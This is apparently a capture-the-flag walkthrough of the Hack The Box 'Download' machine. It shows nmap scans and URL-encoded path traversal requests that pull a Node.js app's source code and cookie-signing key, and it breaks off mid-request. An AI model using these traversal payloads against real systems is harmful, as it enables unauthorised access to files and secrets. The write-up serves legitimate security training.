# Download

## Reconaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.126.79
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 19:15 UTC
Nmap scan report for 10.129.126.79
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA)
|   256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA)
|_  256 e6:ff:77:94:12:40:7b:06:a2:97:7a:de:14:94:5b:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://download.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/5%OT=22%CT=1%CU=30880%PV=Y%DS=2%DC=T%G=Y%TM=64CE9FFD
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=10
OS:4%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=Z%T
OS:S=A)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M
OS:53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN
OS:(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF
OS:0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(
OS:R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N
OS:)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   91.59 ms 10.10.16.1
2   45.20 ms 10.129.126.79

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.47 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.126.79
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 19:17 UTC
Nmap scan report for download.htb (10.129.126.79)
Host is up (0.050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA)
|   256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA)
|_  256 e6:ff:77:94:12:40:7b:06:a2:97:7a:de:14:94:5b:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Download.htb - Share Files With Ease
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/5%OT=22%CT=1%CU=38919%PV=Y%DS=2%DC=T%G=Y%TM=64CEA070
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)SEQ(SP=10
OS:4%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3
OS:=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   43.17 ms 10.10.16.1
2   43.33 ms download.htb (10.129.126.79)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.21 seconds
```

```c
$ sudo nmap -sV -sU 10.129.126.79
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 19:18 UTC
Nmap scan report for download.htb (10.129.126.79)
Host is up (0.069s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1139.88 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.126.79/

We got redirected to `download.htb` which we added to our `/etc/hosts` file.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.126.79   download.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

```c
$ whatweb http://download.htb            
http://download.htb [200 OK] Bootstrap, Cookies[download_session,download_session.sig], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[download_session,download_session.sig], IP[10.129.126.79], Script, Title[Download.htb - Share Files With Ease], X-Powered-By[Express], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

> http://download.htb/files/upload

> http://download.htb/auth/login

> http://download.htb/auth/register

We registered a new user.

| Username | Password |
| --- | --- |
| foobar | foobar |

We intercepted the request with `Burp Suite`.

Request:

```c
POST /auth/register HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://download.htb
DNT: 1
Connection: close
Referer: http://download.htb/auth/register
Cookie: download_session.sig=4kbZR1kOcZNccDLxiSi7Eblym1E; download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=foobar&password=foobar
```

Forwarded Response:

```c
GET /auth/login HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://download.htb/auth/register
DNT: 1
Connection: close
Cookie: download_session.sig=-Bt2m3Q-QwVOVDZ2hVsWmARa1kk; download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91ciBhY2NvdW50IGhhcyBiZWVuIHJlZ2lzdGVyZWQuIl19fQ==
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

> http://download.htb/files/upload

Request:

```c
GET /files/upload HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://download.htb/
DNT: 1
Connection: close
Cookie: download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM; download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
If-None-Match: W/"97d-ImgNB9VLEV5E3PlMGB+dkKKf024"


```

We uploaded a file and checked the `JWT Token`.

Request:

```c
GET /files/view/c95c2512-4781-4c4e-aff3-164cb5c19132 HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://download.htb/files/upload
DNT: 1
Connection: close
Cookie: download_session.sig=tCYbtEIXRBVzfBAhxTxZ54mt8ag; download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91ciBmaWxlIHdhcyBzdWNjZXNzZnVsbHkgdXBsb2FkZWQuIl19LCJ1c2VyIjp7ImlkIjoxNiwidXNlcm5hbWUiOiJmb29iYXIifX0=
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

> https://jwt.io/

```c
eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91ciBmaWxlIHdhcyBzdWNjZXNzZnVsbHkgdXBsb2FkZWQuIl19LCJ1c2VyIjp7ImlkIjoxNiwidXNlcm5hbWUiOiJmb29iYXIifX0=
```

HEADER:ALGORITHM & TOKEN TYPE:

```c
    "info": [],
    "error": [],
    "success": [
      "Your file was successfully uploaded."
    ]
  },
  "user": {
    "id": 16,
    "username": "foobar"
  }
}
```

> http://download.htb/files/view/c95c2512-4781-4c4e-aff3-164cb5c19132

We uploaded a random file and renamed it in the request as `.`.

Modified Request:

```c
POST /files/upload HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------23684812996328125241875424494
Content-Length: 381
Origin: http://download.htb
DNT: 1
Connection: close
Referer: http://download.htb/files/upload
Cookie: download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM; download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------23684812996328125241875424494
Content-Disposition: form-data; name="file"; filename="."
Content-Type: image/jpeg

test

-----------------------------23684812996328125241875424494
Content-Disposition: form-data; name="private"

false
-----------------------------23684812996328125241875424494--

```

We got a file with a `UNIX Timestamp` in it.

```c
tmp-1-1691265133996
```

```c
http://download.htb/files/view/22b02bc1-3c8d-43ce-b804-08a39b71535b
```

We tried to application related files, which should be located somewhere outside of `/download`.

> https://medium.com/codechef-vit/a-better-project-structure-with-express-and-node-js-c23abc2d736f

> https://dev.to/mr_ali3n/folder-structure-for-nodejs-expressjs-project-435l

> https://www.codemzy.com/blog/nodejs-file-folder-structure

First we tried to escape the `/download` directory, which worked by encoding `../` as `%2e%2e%2f`.

Modified Request:

```c
GET /files/download/%2e%2e%2fpackage.json HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 08:17:22 GMT
Content-Type: application/json; charset=UTF-8
Content-Length: 890
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 17:00:43 GMT
ETag: W/"37a-187a4c2cff3"

{
  "name": "download.htb",
  "version": "1.0.0",
  "description": "",
  "main": "app.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev": "nodemon --exec ts-node --files ./src/app.ts",
    "build": "tsc"
  },
  "keywords": [],
  "author": "wesley",
  "license": "ISC",
  "dependencies": {
    "@prisma/client": "^4.13.0",
    "cookie-parser": "^1.4.6",
    "cookie-session": "^2.0.0",
    "express": "^4.18.2",
    "express-fileupload": "^1.4.0",
    "zod": "^3.21.4"
  },
  "devDependencies": {
    "@types/cookie-parser": "^1.4.3",
    "@types/cookie-session": "^2.0.44",
    "@types/express": "^4.17.17",
    "@types/express-fileupload": "^1.4.1",
    "@types/node": "^18.15.12",
    "@types/nunjucks": "^3.2.2",
    "nodemon": "^2.0.22",
    "nunjucks": "^3.2.4",
    "prisma": "^4.13.0",
    "ts-node": "^10.9.1",
    "typescript": "^5.0.4"
  }
}
```

| Username |
| --- |
| wesley |

Modified Request:

```c
GET /files/download/%2e%2e%2fapp.js HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/files/view/85ff1b89-66d6-42a1-884d-2863bda65ce9
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 05:36:57 GMT
Content-Type: application/javascript; charset=UTF-8
Content-Length: 2168
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 17:11:40 GMT
ETag: W/"878-187a4ccd572"

"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const nunjucks_1 = __importDefault(require("nunjucks"));
const path_1 = __importDefault(require("path"));
const cookie_parser_1 = __importDefault(require("cookie-parser"));
const cookie_session_1 = __importDefault(require("cookie-session"));
const flash_1 = __importDefault(require("./middleware/flash"));
const auth_1 = __importDefault(require("./routers/auth"));
const files_1 = __importDefault(require("./routers/files"));
const home_1 = __importDefault(require("./routers/home"));
const client_1 = require("@prisma/client");
const app = (0, express_1.default)();
const port = 3000;
const client = new client_1.PrismaClient();
const env = nunjucks_1.default.configure(path_1.default.join(__dirname, "views"), {
    autoescape: true,
    express: app,
    noCache: true,
});
app.use((0, cookie_session_1.default)({
    name: "download_session",
    keys: ["8929874489719802418902487651347865819634518936754"],
    maxAge: 7 * 24 * 60 * 60 * 1000,
}));
app.use(flash_1.default);
app.use(express_1.default.urlencoded({ extended: false }));
app.use((0, cookie_parser_1.default)());
app.use("/static", express_1.default.static(path_1.default.join(__dirname, "static")));
app.get("/", (req, res) => {
    res.render("index.njk");
});
app.use("/files", files_1.default);
app.use("/auth", auth_1.default);
app.use("/home", home_1.default);
app.use("*", (req, res) => {
    res.render("error.njk", { statusCode: 404 });
});
app.listen(port, process.env.NODE_ENV === "production" ? "127.0.0.1" : "0.0.0.0", () => {
    console.log("Listening on ", port);
    if (process.env.NODE_ENV === "production") {
        setTimeout(async () => {
            await client.$executeRawUnsafe(`COPY (SELECT "User".username, sum("File".size) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`);
        }, 300000);
    }
});
```

| Key |
| --- |
| 8929874489719802418902487651347865819634518936754 |

Modified Request:

```c
GET /files/download/%2e%2e%2frouters%2fauth.js HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 08:54:49 GMT
Content-Type: application/javascript; charset=UTF-8
Content-Length: 2923
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 15:25:49 GMT
ETag: W/"b6b-187a46bed31"

"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const client_1 = require("@prisma/client");
const express_1 = __importDefault(require("express"));
const zod_1 = __importDefault(require("zod"));
const node_crypto_1 = __importDefault(require("node:crypto"));
const router = express_1.default.Router();
const client = new client_1.PrismaClient();
const hashPassword = (password) => {
    return node_crypto_1.default.createHash("md5").update(password).digest("hex");
};
const LoginValidator = zod_1.default.object({
    username: zod_1.default.string().min(6).max(64),
    password: zod_1.default.string().min(6).max(64),
});
router.get("/login", (req, res) => {
    res.render("login.njk");
});
router.post("/login", async (req, res) => {
    const result = LoginValidator.safeParse(req.body);
    if (!result.success) {
        res.flash("error", "Your login details were invalid, please try again.");
        return res.redirect("/auth/login");
    }
    const data = result.data;
    const user = await client.user.findFirst({
        where: { username: data.username, password: hashPassword(data.password) },
    });
    if (!user) {
        res.flash("error", "That username / password combination did not exist.");
        return res.redirect("/auth/register");
    }
    req.session.user = {
        id: user.id,
        username: user.username,
    };
    res.flash("success", "You are now logged in.");
    return res.redirect("/home/");
});
router.get("/register", (req, res) => {
    res.render("register.njk");
});
const RegisterValidator = zod_1.default.object({
    username: zod_1.default.string().min(6).max(64),
    password: zod_1.default.string().min(6).max(64),
});
router.post("/register", async (req, res) => {
    const result = RegisterValidator.safeParse(req.body);
    if (!result.success) {
        res.flash("error", "Your registration details were invalid, please try again.");
        return res.redirect("/auth/register");
    }
    const data = result.data;
    const existingUser = await client.user.findFirst({
        where: { username: data.username },
    });
    if (existingUser) {
        res.flash("error", "There is already a user with that email address or username.");
        return res.redirect("/auth/register");
    }
    await client.user.create({
        data: {
            username: data.username,
            password: hashPassword(data.password),
        },
    });
    res.flash("success", "Your account has been registered.");
    return res.redirect("/auth/login");
});
router.get("/logout", (req, res) => {
    if (req.session)
        req.session.user = null;
    res.flash("success", "You have been successfully logged out.");
    return res.redirect("/auth/login");
});
exports.default = router;
```

Modified Request:

```c
GET /files/download/%2e%2e%2frouters%2ffiles.js HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 08:56:37 GMT
Content-Type: application/javascript; charset=UTF-8
Content-Length: 4732
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 16:08:04 GMT
ETag: W/"127c-187a4929d56"

"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const client_1 = require("@prisma/client");
const express_1 = __importDefault(require("express"));
const express_fileupload_1 = __importDefault(require("express-fileupload"));
const auth_1 = __importDefault(require("../middleware/auth"));
const zod_1 = __importDefault(require("zod"));
const promises_1 = __importDefault(require("fs/promises"));
const path_1 = __importDefault(require("path"));
const router = express_1.default.Router();
const client = new client_1.PrismaClient();
const uploadPath = path_1.default.join(__dirname, "..", "uploads");
router.get("/upload", (req, res) => {
    res.render("upload.njk");
});
const UploadValidator = zod_1.default.object({
    private: zod_1.default
        .enum(["true", "false"])
        .transform((value) => value === "true")
        .optional(),
});
router.post("/upload", (0, express_fileupload_1.default)({
    limits: { fileSize: 2.5 * 1024 * 1024 },
}), async (req, res) => {
    if (!req.files || !req.files.file || Array.isArray(req.files.file)) {
        res.flash("error", "Please select a file to upload.");
        return res.redirect("/files/upload");
    }
    const file = req.files.file;
    if (file.truncated) {
        res.flash("error", "There seems to be an issue processing this specific file, please try again later, sorry!");
        return res.redirect("/files/upload");
    }
    const result = UploadValidator.safeParse(req.body);
    if (!result.success) {
        res.flash("error", "There seems to be an issue processing your upload options, please try again later.");
        return res.redirect("/files/upload");
    }
    const fileEntry = await client.file.create({
        data: {
            name: file.name,
            size: file.size,
            authorId: req.session?.user?.id,
            private: req.session?.user ? result.data.private : false,
        },
        select: {
            id: true,
        },
    });
    const filePath = path_1.default.join(uploadPath, fileEntry.id);
    await file.mv(filePath);
    res.flash("success", "Your file was successfully uploaded.");
    return res.redirect(`/files/view/${fileEntry.id}`);
});
router.get("/view/:fileId", async (req, res) => {
    const fileEntry = await client.file.findFirst({
        where: { id: req.params.fileId },
        select: {
            id: true,
            uploadedAt: true,
            size: true,
            name: true,
            private: true,
            authorId: true,
            author: {
                select: {
                    username: true,
                },
            },
        },
    });
    if (!fileEntry || (fileEntry.private && req.session?.user?.id !== fileEntry.authorId)) {
        res.flash("error", "We could not find this file. It may have been deleted or it has expired.");
        return res.redirect("/files/upload");
    }
    res.render("view.njk", { file: fileEntry });
});
router.get("/download/:fileId", async (req, res) => {
    const fileEntry = await client.file.findFirst({
        where: { id: req.params.fileId },
        select: {
            name: true,
            private: true,
            authorId: true,
        },
    });
    if (fileEntry?.private && req.session?.user?.id !== fileEntry.authorId) {
        return res.status(404);
    }
    return res.download(path_1.default.join(uploadPath, req.params.fileId), fileEntry?.name ?? "Unknown");
});
router.post("/delete/:fileId", auth_1.default, async (req, res) => {
    const fileEntry = await client.file.findFirst({
        where: { id: req.params.fileId },
        select: {
            name: true,
            id: true,
            authorId: true,
            author: {
                select: {
                    username: true,
                },
            },
        },
    });
    if (!fileEntry || fileEntry.authorId !== req.session.user.id) {
        res.flash("error", "We could not find this file. It may have been deleted or it has expired.");
        return res.redirect("/home/");
    }
    try {
        await promises_1.default.rm(path_1.default.join(uploadPath, fileEntry.id));
        await client.file.delete({
            where: {
                id: fileEntry.id,
            },
        });
        res.flash("success", "The file was successfully deleted.");
        return res.redirect("/home/");
    }
    catch (err) {
        res.flash("error", "Sorry, something went wrong trying to delete this file. Please try again later.");
        return res.redirect("/home/");
    }
});
exports.default = router;
```

Modified Request:

```c
GET /files/download/%2e%2e%2frouters%2fhome.js HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 08:57:28 GMT
Content-Type: application/javascript; charset=UTF-8
Content-Length: 990
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 15:25:49 GMT
ETag: W/"3de-187a46bed31"

"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const client_1 = require("@prisma/client");
const express_1 = __importDefault(require("express"));
const auth_1 = __importDefault(require("../middleware/auth"));
const client = new client_1.PrismaClient();
const router = express_1.default.Router();
router.get("/", auth_1.default, async (req, res) => {
    const files = await client.file.findMany({
        where: { author: req.session.user },
        select: {
            id: true,
            uploadedAt: true,
            size: true,
            name: true,
            private: true,
            authorId: true,
            author: {
                select: {
                    username: true,
                },
            },
        },
    });
    res.render("home.njk", { files });
});
exports.default = router;
```

Modified Request:

```c
GET /files/download/%2e%2e%2fmiddleware%2fflash.js HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 08:59:39 GMT
Content-Type: application/javascript; charset=UTF-8
Content-Length: 999
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 15:25:49 GMT
ETag: W/"3e7-187a46bed31"

"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.default = (req, res, next) => {
    if (!req.session || !req.session.flashes) {
        req.session.flashes = {
            info: [],
            error: [],
            success: [],
        };
    }
    res.flash = (type, message) => {
        req.session.flashes[type].push(message);
    };
    const _render = res.render;
    res.render = function (view, passedOptions) {
        // continue with original render
        const flashes = {
            info: req.session.flashes.info.join("<br/>"),
            error: req.session.flashes.error.join("<br/>"),
            success: req.session.flashes.success.join("<br/>"),
        };
        req.session.flashes = {
            info: [],
            error: [],
            success: [],
        };
        const options = { ...passedOptions, user: req.session?.user, flashes, baseUrl: req.baseUrl };
        _render.call(this, view, options);
    };
    next();
};
```

Modified Request:

```c
GET /files/download/%2e%2e%2fviews%2fhome.njk HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
